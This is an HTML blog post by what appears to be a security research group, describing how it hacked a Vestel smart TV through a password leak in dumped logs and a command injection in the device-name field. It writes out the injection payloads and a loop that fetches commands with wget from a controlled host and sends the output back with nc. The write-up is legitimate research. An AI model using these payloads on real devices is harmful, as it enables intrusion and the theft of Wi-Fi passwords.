<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>Hacking A Vestel TV - 0DRG</title><meta name=Description content="Finding 0days for fun ... mostly"><meta property="og:title" content="Hacking A Vestel TV"><meta property="og:description" content="Hacking A Vestel Smart TV The 0DRG group decided to look at a readily avaliable voxicom smart TV as the first target. The Voxicon smart TV is a rebranding of a Vestel TV, from a Turkish TV manufacturer. Vestel makes TV&rsquo;s for several well known vendors:
Toshiba Hitatchi Medion Polaroid Finlux The TV&rsquo;s come repackaged with a vendor specific config, but seem to otherwise be the same.
We found several bugs in the Vestel firmware:"><meta property="og:type" content="article"><meta property="og:url" content="https://0DayResearchGroup.github.io/posts/hacking_a_vestel_tv/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-02-07T21:35:39+01:00"><meta property="article:modified_time" content="2023-02-07T21:35:39+01:00"><meta property="og:site_name" content="0DRG"><meta name=twitter:card content="summary"><meta name=twitter:title content="Hacking A Vestel TV"><meta name=twitter:description content="Hacking A Vestel Smart TV The 0DRG group decided to look at a readily avaliable voxicom smart TV as the first target. The Voxicon smart TV is a rebranding of a Vestel TV, from a Turkish TV manufacturer. Vestel makes TV&rsquo;s for several well known vendors:
Toshiba Hitatchi Medion Polaroid Finlux The TV&rsquo;s come repackaged with a vendor specific config, but seem to otherwise be the same.
We found several bugs in the Vestel firmware:"><meta name=application-name content="My cool site"><meta name=apple-mobile-web-app-title content="My cool site"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=https://0DayResearchGroup.github.io/posts/hacking_a_vestel_tv/><link rel=next href=https://0DayResearchGroup.github.io/posts/lan_to_root_zyxel/><link rel=stylesheet href=/css/style.min.css><link rel=preload href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css></noscript><link rel=preload href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"Hacking A Vestel TV","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/0DayResearchGroup.github.io\/posts\/hacking_a_vestel_tv\/"},"genre":"posts","wordcount":918,"url":"https:\/\/0DayResearchGroup.github.io\/posts\/hacking_a_vestel_tv\/","datePublished":"2023-02-07T21:35:39+01:00","dateModified":"2023-02-07T21:35:39+01:00","publisher":{"@type":"Organization","name":""},"author":{"@type":"Person","name":"0DRG"},"description":""}</script></head><body data-header-desktop=fixed data-header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem("theme")?localStorage.getItem("theme")==="dark":"dark"==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:"dark"==="dark")&&document.body.setAttribute("theme","dark")</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title=0DRG>0DRG</a></div><div class=menu><div class=menu-inner><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme"><i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title=0DRG>0DRG</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme"><i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></header><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>Contents</h2><div class=toc-content id=toc-content-auto></div></div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Hacking A Vestel TV</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=/ title=Author rel=author class=author><i class="fas fa-user-circle fa-fw" aria-hidden=true></i>0DRG</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw" aria-hidden=true></i>&nbsp;<time datetime=2023-02-07>2023-02-07</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden=true></i>&nbsp;918 words&nbsp;
<i class="far fa-clock fa-fw" aria-hidden=true></i>&nbsp;5 minutes&nbsp;</div></div><div class="details toc" id=toc-static data-kept><div class="details-summary toc-title"><span>Contents</span>
<span><i class="details-icon fas fa-angle-right" aria-hidden=true></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#getting-useful-execution>Getting useful execution</a></li><li><a href=#getting-a-shell-ish>Getting a shell (ish)</a></li><li><a href=#further-analysis>Further Analysis</a></li></ul></nav></div></div><div class=content id=content><h1 id=hacking-a-vestel-smart-tv>Hacking A Vestel Smart TV</h1><p>The 0DRG group decided to look at a readily avaliable voxicom smart TV as the first target.
The Voxicon smart TV is a rebranding of a Vestel TV, from a Turkish TV manufacturer.
Vestel makes TV&rsquo;s for several well known vendors:</p><ol><li>Toshiba</li><li>Hitatchi</li><li>Medion</li><li>Polaroid</li><li>Finlux</li></ol><p>The TV&rsquo;s come repackaged with a vendor specific config, but seem to otherwise be the same.</p><p>We found several bugs in the Vestel firmware:</p><ol><li>Plaintext WPA password disclosed in logs</li><li>Command injection in device name</li></ol><h1 id=background>Background</h1><p>We started our analysis by exploring the functionality of the TV.
It contains what you would expect from a modern smart TV,
including a webbrowser, apps, and an appstore.
Despite the TV looking like it was build with android, the appstore contained
next to no apps.</p><p>Some TV&rsquo;s come installed with the google play store, if that is the case then
a good first step is to download termux or similar.</p><p>Since this was not the case we were stuck with exploring the UI.</p><p>This yielded very little in the begging, so we decided to unscrew the backpanel
to get access to the main board.</p><p>The back panel came off easily and we could locate the mainboard, that contained the board model.
<img class=lazyload src=/svg/loading.min.svg data-src=/Images/vestel_board_image.jpg data-srcset="/Images/vestel_board_image.jpg, /Images/vestel_board_image.jpg 1.5x, /Images/vestel_board_image.jpg 2x" data-sizes=auto alt=/Images/vestel_board_image.jpg title="Picture of the board"></p><p>The model of the board is <code>Vestel17B180E</code>, a bit of googling revealed the service manual <a href=https://portal.repairtech.co.uk/downloads/17MB180E_SERVICE_MANUAL.PDF target=_blank rel="noopener noreffer">here</a>.
This shows a bunch of useful info, we might have needed if we didn&rsquo;t find another bug.</p><p>Googling vestel TV functionality led to the discovery of the debug menu.
This can be entered by:</p><ol><li>Pressing home on the remote</li><li>Pressing <code>4725</code> on the numpad</li></ol><p><img class=lazyload src=/svg/loading.min.svg data-src=/Images/vestel_debug_menu.jpg data-srcset="/Images/vestel_debug_menu.jpg, /Images/vestel_debug_menu.jpg 1.5x, /Images/vestel_debug_menu.jpg 2x" data-sizes=auto alt=/Images/vestel_debug_menu.jpg title="Debug menu"></p><p>The above screenshot shows an option regarding UART, which made us hopeful for UART access.
Despite a few hours of trial and error, we did not manage to read data from it however.</p><h1 id=plaintext-password-disclosure>Plaintext Password Disclosure</h1><p>This bug is less severe but quite fun.
By dumping the logs to a FAT32 formatted thumbrive, using the dump logs option in the debug screen,
we noticed the plaintext password of the wifi&rsquo;s we had recently connected to.
Despite this not being a severe vulnerability, it still meant we could dump the phone hotspot passwords
of the TV&rsquo;s in our uni. Since most students would connect the TV to their phones hotspot if need be.</p><p>The password shows up in a log line looking like:</p><pre tabindex=0><code>[PskEncryption, 1778]cmd = wpa_passphrase &#34;wifi-name&#34; &#34;password&#34;| grep &#39;\spsk=&#39;
</code></pre><h1 id=command-injection>Command Injection</h1><p>The OS contains a command injection vulnerability in the device name.
By selecting <code>wifi display</code> as a source, a new menu item will appear in the settings menu.
This option is for changing the device name of the TV in wifi peering mode.
Changing this option triggers the following command to be run as the aurora user:
<code>sed -i 's/^device_name=.*/device_name=; [user input]' /conf/Miracast_Adapter.config</code></p><p>We could confirm the vulnerability by entering <code>'; reboot &'</code>, which would reboot the TV.</p><h2 id=getting-useful-execution>Getting useful execution</h2><p>Rebooting is not a very useful primitive. We want to execute anything on the device.
This presented a problem because the input field for the device name was limited to 20 chars.
Two of which would go to the initial escape chars, so we&rsquo;re left with 18 characters of injection.</p><p>A quick brainstorm was made, and it was decided that the easiest method of payload delivery would be
through the USB port.</p><p>Essentially, because the TV auto mounts any FAT32 usb that gets inserted, the mount path just needed to be short enough to put in the field. We could then put an executable named a single char, and get it to run.</p><p>Revisiting the logs, we found the mountpoint to be <code>/mnt/hd0a/</code> for our USB.
We then compiled a reverse shell to the specific ARM chip and executed:</p><pre tabindex=0><code>&#39;;/mnt/hd0a/a &amp;&#39;
</code></pre><p>But nothing&mldr;</p><p>It turns out that for some reason the FAT32 did not support us making the file executable.
Annoying as that was, we managed to sidestep the issue using <code>sh</code> and shellscripts instead.
In most shells you can execute <code>sh&lt;script.sh</code> which is equivalent to <code>cat script.sh | sh</code>.
The file does not need to be executable because <code>sh</code> will be interpreting the script directly from stdin.</p><pre tabindex=0><code>&#39;;sh&lt;/mnt/hd0a/a &amp;&#39;
</code></pre><p>This ended up being the final payload, with a shell script that would reboot the device.
<img class=lazyload src=/svg/loading.min.svg data-src=/Images/vestel_shell_inject.jpg data-srcset="/Images/vestel_shell_inject.jpg, /Images/vestel_shell_inject.jpg 1.5x, /Images/vestel_shell_inject.jpg 2x" data-sizes=auto alt=/Images/vestel_shell_inject.jpg title="Shell injection"></p><p>Once we had access to the files on the TV, we were able to find the actual vulnerability doing some reverse engineering. It is located in the <strong>ICE_WiDiResetFriendlyName</strong> function of the aurora.elf file.</p><h2 id=getting-a-shell-ish>Getting a shell (ish)</h2><p>We tried various reverse shell payloads on the TV, but nothing worked.
After messing about with this for a few hours (we needed to manually insert the injection, as well as replace the file on the USB every time), we decided on going 100% jank and creating a pseudo shell instead.</p><p>The final shell would look like the following:</p><pre tabindex=0><code>while True
do
wget http://192.168.0.6:8000/cmd -O - | sh 2&amp;&gt;1 | nc 192.168.0.6 8888 
sleep 2
done
</code></pre><p>On the networked machine, we would then start a webserver serving the <code>cmd</code> file with the command we wanted to run, as well as a listener with <code>nc</code> on port 8888 to recieve the results.
This worked, and we could browse the system without having to unplug and replug a USB for every command.</p><h2 id=further-analysis>Further Analysis</h2><p>After messing around in the file system as a restricted user, we wanted to step up and find some over the air vulnerability.
We also wanted to explore the oppertunities for rooting the device.
This is still on the drawing block.</p></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>Updated on 2023-02-07</span></div></div><div class=post-info-line><div class=post-info-md></div><div class=post-info-share><span><a href=javascript:void(0); title="Share on Twitter" data-sharer=twitter data-url=https://0DayResearchGroup.github.io/posts/hacking_a_vestel_tv/ data-title="Hacking A Vestel TV"><i class="fab fa-twitter fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Facebook" data-sharer=facebook data-url=https://0DayResearchGroup.github.io/posts/hacking_a_vestel_tv/><i class="fab fa-facebook-square fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Hacker News" data-sharer=hackernews data-url=https://0DayResearchGroup.github.io/posts/hacking_a_vestel_tv/ data-title="Hacking A Vestel TV"><i class="fab fa-hacker-news fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Line" data-sharer=line data-url=https://0DayResearchGroup.github.io/posts/hacking_a_vestel_tv/ data-title="Hacking A Vestel TV"><i data-svg-src=https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg aria-hidden=true></i></a><a href=javascript:void(0); title="Share on 微博" data-sharer=weibo data-url=https://0DayResearchGroup.github.io/posts/hacking_a_vestel_tv/ data-title="Hacking A Vestel TV"><i class="fab fa-weibo fa-fw" aria-hidden=true></i></a></span></div></div></div><div class=post-info-more><section class=post-tags></section><section><span><a href=javascript:void(0); onclick=window.history.back()>Back</a></span>&nbsp;|&nbsp;<span><a href=/>Home</a></span></section></div><div class=post-nav><a href=/posts/lan_to_root_zyxel/ class=next rel=next title=Lan_To_Root_Zyxel>Lan_To_Root_Zyxel<i class="fas fa-angle-right fa-fw" aria-hidden=true></i></a></div></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line>Powered by <a href=https://gohugo.io/ target=_blank rel="noopener noreffer" title="Hugo 0.111.3">Hugo</a> | Theme - <a href=https://github.com/dillonzq/LoveIt target=_blank rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden=true></i> LoveIt</a></div><div class=footer-line itemscope itemtype=http://schema.org/CreativeWork><i class="far fa-copyright fa-fw" aria-hidden=true></i><span itemprop=copyrightYear>2022 - 2023</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ target=_blank>0DRG</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top"><i class="fas fa-arrow-up fa-fw" aria-hidden=true></i>
</a><a href=# id=view-comments class=fixed-button title="View Comments"><i class="fas fa-comment fa-fw" aria-hidden=true></i></a></div><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"Copy to clipboard",maxShownLines:50},comment:{}}</script><script type=text/javascript src=/js/theme.min.js></script></body></html>